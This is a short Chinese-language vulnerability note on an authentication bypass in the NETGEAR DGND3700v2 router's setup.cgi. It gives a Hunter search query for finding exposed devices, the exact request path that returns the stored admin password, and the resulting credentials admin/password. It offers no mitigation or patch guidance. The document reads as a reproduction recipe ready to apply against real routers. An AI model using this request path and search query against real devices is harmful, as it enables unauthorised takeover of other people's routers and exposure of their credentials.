# NETGEAR DGND3700v2 路由器 setup.cgi 接口身份认证绕过漏洞

# 一、漏洞简介
NETGEAR DGND3700v2 是一款高效的企业路由器，NETGEAR DGND3700v2 存在身份认证绕过漏洞，攻击者可利用漏洞读取用户账号密码，访问敏感信息页面。

# 二、影响版本
+ NETGEAR DGND3700v2

# 三、资产测绘
+ hunter`web.title="DGND3700v2"`

# 四、漏洞复现
```java
/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm
```

![1702017292533-6337aabc-a1b3-455f-acee-a10ad3c20dfc.png](./img/frUEBsj0hfsCuNcA/1702017292533-6337aabc-a1b3-455f-acee-a10ad3c20dfc-883162.png)

通过上述密码登录系统

`admin/password`

![1702017321828-68b8d415-f1e3-459a-aec6-0ba1bbeedea3.png](./img/frUEBsj0hfsCuNcA/1702017321828-68b8d415-f1e3-459a-aec6-0ba1bbeedea3-446432.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nfl28ku7srgz3zrl>